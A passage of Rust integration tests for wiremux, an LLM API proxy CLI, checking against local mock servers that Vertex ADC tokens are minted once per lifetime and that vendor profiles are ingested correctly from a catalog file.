    let token_srv = TcpListener::bind("127.0.0.1:0").expect("token bind");
    let token_addr = token_srv.local_addr().expect("addr");
    token_srv.set_nonblocking(true).expect("token nonblocking");
    let stop = Arc::new(AtomicU64::new(0));
    let stop_flag = Arc::clone(&stop);
    let token_thread = std::thread::spawn(move || {
        let deadline = Instant::now() + Duration::from_secs(8);
        while stop_flag.load(Ordering::Relaxed) == 0 && Instant::now() < deadline {
            match token_srv.accept() {
                Ok((mut stream, _)) => {
                    token_hits.fetch_add(1, Ordering::Relaxed);
                    let mut buf = [0u8; 8192];
                    let _ = stream.read(&mut buf);
                    let body =
                        r#"{"access_token":"ya29.once","expires_in":3600,"token_type":"Bearer"}"#;
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = stream.write_all(resp.as_bytes());
                }
                Err(err) if err.kind() == std::io::ErrorKind::WouldBlock => {
                    std::thread::sleep(Duration::from_millis(20));
                }
                Err(_) => break,
            }
        }
    });

    let upstream = TcpListener::bind("127.0.0.1:0").expect("upstream bind");
    let upstream_addr = upstream.local_addr().expect("addr");
    let upstream_thread = std::thread::spawn(move || {
        let mut seen = Vec::new();
        for _ in 0..2 {
            let (mut stream, _) = upstream.accept().expect("accept");
            let mut buf = [0u8; 8192];
            let n = stream.read(&mut buf).unwrap_or(0);
            seen.push(String::from_utf8_lossy(&buf[..n]).into_owned());
            let body =
                r#"{"candidates":[{"content":{"parts":[{"text":"ok"}]},"finishReason":"STOP"}]}"#;
            let resp = format!(
                "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
                body.len()
            );
            let _ = stream.write_all(resp.as_bytes());
        }
        seen
    });

    let (home, mut cmd) = isolated_home();
    let adc_path = home.path().join("adc.json");
    std::fs::write(
        &adc_path,
        format!(
            r#"{{"type":"authorized_user","client_id":"123.apps.googleusercontent.com","client_secret":"user-secret","refresh_token":"1//refresh-me","token_uri":"http://{token_addr}/token"}}"#
        ),
    )
    .expect("write adc");
    let dir = unique_scratch();
    let profile = write_profile(
        &dir,
        "vertex-mint.toml",
        &format!(
            r#"
schema_version = 1
id = "vertex-mint"
wire = "gemini"
auth_scheme = "bearer"
base_url = "http://{upstream_addr}"
chat_path = "/v1/projects/p/locations/us/publishers/google/models/{{model}}:generateContent"
gcp_key_env = "GOOGLE_APPLICATION_CREDENTIALS"
"#
        ),
    );

    let mut child = cmd
        .env("GOOGLE_APPLICATION_CREDENTIALS", &adc_path)
        .args([
            "proxy",
            "--listen",
            "127.0.0.1:0",
            "--from",
            "chat",
            "--profile",
            profile.to_str().expect("utf8"),
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn proxy");

    let listen = read_listen_addr(child.stdout.as_mut().expect("stdout"));
    let body = r#"{"model":"gemini-2.0-flash","stream":false,"messages":[{"role":"user","content":"hi"}]}"#;
    let req = format!(
        "POST /v1/chat/completions HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    for _ in 0..2 {
        let mut client = TcpStream::connect(listen).expect("connect proxy");
        client
            .set_read_timeout(Some(Duration::from_secs(5)))
            .expect("timeout");
        client.write_all(req.as_bytes()).expect("write");
        let mut resp = String::new();
        let _ = client.read_to_string(&mut resp);
        assert!(
            resp.contains("ok") || resp.contains("chat.completion"),
            "vertex proxy request failed: {resp}"
        );
    }
    let _ = child.kill();
    let _ = child.wait();
    stop.store(1, Ordering::Relaxed);
    let _ = token_thread.join();
    let seen = upstream_thread.join().expect("upstream");
    assert_eq!(seen.len(), 2, "two upstream calls, got {seen:?}");
    assert_eq!(
        hits.load(Ordering::Relaxed),
        1,
        "Vertex ADC must mint once per token lifetime, not per request"
    );
}

fn http_head_and_body(resp: &[u8]) -> (String, Vec<u8>) {
    let sep = resp
        .windows(4)
        .position(|w| w == b"\r\n\r\n")
        .expect("http header terminator");
    let head = String::from_utf8_lossy(&resp[..sep]).into_owned();
    let raw = &resp[sep + 4..];
    let body = if head
        .to_ascii_lowercase()
        .contains("transfer-encoding: chunked")
    {
        decode_chunked(raw)
    } else {
        raw.to_vec()
    };
    (head, body)
}

fn decode_chunked(mut raw: &[u8]) -> Vec<u8> {
    let mut out = Vec::new();
    while !raw.is_empty() {
        let Some(nl) = raw.windows(2).position(|w| w == b"\r\n") else {
            break;
        };
        let size_line = std::str::from_utf8(&raw[..nl]).unwrap_or("");
        let size = usize::from_str_radix(size_line.trim(), 16).unwrap_or(0);
        raw = &raw[nl + 2..];
        if size == 0 {
            break;
        }
        if raw.len() < size {
            break;
        }
        out.extend_from_slice(&raw[..size]);
        raw = &raw[size..];
        if raw.starts_with(b"\r\n") {
            raw = &raw[2..];
        }
    }
    out
}

fn eventstream_raw_payloads(mut raw: &[u8]) -> Vec<serde_json::Value> {
    let mut out = Vec::new();
    while raw.len() >= 16 {
        let total = u32::from_be_bytes(raw[0..4].try_into().expect("total")) as usize;
        if total < 16 || total > raw.len() {
            break;
        }
        let headers_len = u32::from_be_bytes(raw[4..8].try_into().expect("headers")) as usize;
        let start = 12usize.saturating_add(headers_len);
        let end = total.saturating_sub(4);
        if start < end
            && end <= raw.len()
            && let Ok(value) = serde_json::from_slice(&raw[start..end])
        {
            out.push(value);
        }
        raw = &raw[total..];
    }
    out
}

fn eventstream_frames(body: &[u8]) -> Vec<wiremux::stream::RawSse> {
    let mut reader = wiremux::stream::EventStreamReader::new();
    let (mut frames, err) = reader.feed(body).expect("eventstream feed");
    assert!(err.is_none(), "{err:?}");
    if let Some(last) = reader.drain() {
        frames.push(last);
    }
    frames
}

fn read_listen_addr(stdout: &mut impl Read) -> std::net::SocketAddr {
    let deadline = Instant::now() + Duration::from_secs(5);
    let mut buf = Vec::new();
    let mut byte = [0u8; 1];
    while Instant::now() < deadline {
        match stdout.read(&mut byte) {
            Ok(1) => {
                buf.push(byte[0]);
                if byte[0] == b'\n' {
                    let line = String::from_utf8_lossy(&buf);
                    if let Some(addr) = line
                        .split_whitespace()
                        .rev()
                        .find_map(|tok| tok.trim().parse::<std::net::SocketAddr>().ok())
                    {
                        return addr;
                    }
                    buf.clear();
                }
            }
            Ok(0) => break,
            Ok(_) => {}
            Err(err) if err.kind() == std::io::ErrorKind::WouldBlock => {
                std::thread::sleep(Duration::from_millis(20));
            }
            Err(_) => std::thread::sleep(Duration::from_millis(20)),
        }
    }
    panic!(
        "proxy did not print a listen address; got: {}",
        String::from_utf8_lossy(&buf)
    );
}

const INGEST_FIXTURE: &str = r#"
{
  "groq": {
    "id": "groq",
    "name": "Groq",
    "env": ["GROQ_API_KEY"],
    "npm": "@ai-sdk/groq"
  },
  "deepseek": {
    "id": "deepseek",
    "name": "DeepSeek",
    "env": ["DEEPSEEK_API_KEY"],
    "npm": "@ai-sdk/openai-compatible",
    "api": "https://api.deepseek.com"
  },
  "azure": {
    "id": "azure",
    "name": "Azure",
    "env": ["AZURE_API_KEY"],
    "npm": "@ai-sdk/azure"
  }
}
"#;

#[test]
fn profile_ingest_from_file_writes_user_dir() {
    let scratch = unique_scratch();
    let catalog = scratch.join("catalog.json");
    std::fs::write(&catalog, INGEST_FIXTURE).expect("catalog");
    let dest = scratch.join("profiles");
    let (_home, mut cmd) = isolated_home();
    let out = cmd
        .args([
            "profile",
            "ingest",
            "--from-file",
            catalog.to_str().expect("utf8"),
            "--vendor",
            "groq",
            "--vendor",
            "deepseek",
            "--force",
            "--dir",
            dest.to_str().expect("utf8"),
        ])
        .output()
        .expect("run");
    assert_eq!(out.status.code(), Some(0), "{:?}", out);
    let stdout = String::from_utf8_lossy(&out.stdout);
    assert!(stdout.contains("wrote"), "{stdout}");
    let groq = std::fs::read_to_string(dest.join("groq.toml")).expect("groq");
    assert!(groq.contains("id = \"groq\""));
    assert!(groq.contains("https://api.groq.com"));
    assert!(groq.contains("/openai/v1/chat/completions"));
    let (_home, mut list) = isolated_home();
    list.env("WIREMUX_PROFILE_DIR", &dest);
    let listed = list.args(["profile", "list"]).output().expect("list");
    assert_eq!(listed.status.code(), Some(0), "{:?}", listed);
    let ids = String::from_utf8_lossy(&listed.stdout);
    assert!(ids.contains("groq"), "{ids}");
    assert!(ids.contains("deepseek"), "{ids}");
}

#[test]
fn profile_ingest_writes_azure_deployment_template() {
    let scratch = unique_scratch();
    let catalog = scratch.join("catalog.json");
    std::fs::write(
        &catalog,
        r#"{
  "azure": {
    "id": "azure",
    "name": "Azure",
    "env": ["AZURE_RESOURCE_NAME", "AZURE_API_KEY"],
    "npm": "@ai-sdk/azure"
  }
}"#,
    )
    .expect("catalog");
    let dest = scratch.join("profiles");
    let (_home, mut cmd) = isolated_home();
    let out = cmd
        .args([
            "profile",
            "ingest",
            "--from-file",
            catalog.to_str().expect("utf8"),
            "--vendor",
            "azure",
            "--dir",
            dest.to_str().expect("utf8"),
        ])
        .output()
        .expect("run");
    assert_eq!(out.status.code(), Some(0), "{:?}", out);
    let body = std::fs::read_to_string(dest.join("azure.toml")).expect("azure");
    assert!(body.contains("deployments/{model}/chat/completions"));
    assert!(body.contains("header:api-key"));
}
